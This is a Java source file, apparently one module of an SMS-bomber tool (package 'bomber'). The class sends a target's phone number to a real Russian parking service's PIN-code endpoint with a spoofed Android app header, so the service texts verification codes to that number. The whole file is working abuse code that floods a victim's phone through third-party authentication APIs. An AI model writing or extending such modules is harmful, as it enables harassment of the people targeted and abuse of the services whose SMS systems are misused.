package bomber.ojiekcahdp.dev.services;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.Request;

public class Gorparkovka extends JsonService {

    public Gorparkovka() {
        setUrl("https://belparking.ru/auth/api/1.0/pincodes");
        setMethod(POST);
        setPhoneCode("7");
    }

    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("x-client-info", "androidMobileApp/2.6.5");

        return super.buildRequest(builder);
    }

    @Override
    public String buildJson() {
        JSONObject json = new JSONObject();

        try {
            json.put("phone", getFormattedPhone());
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json.toString();
    }
}
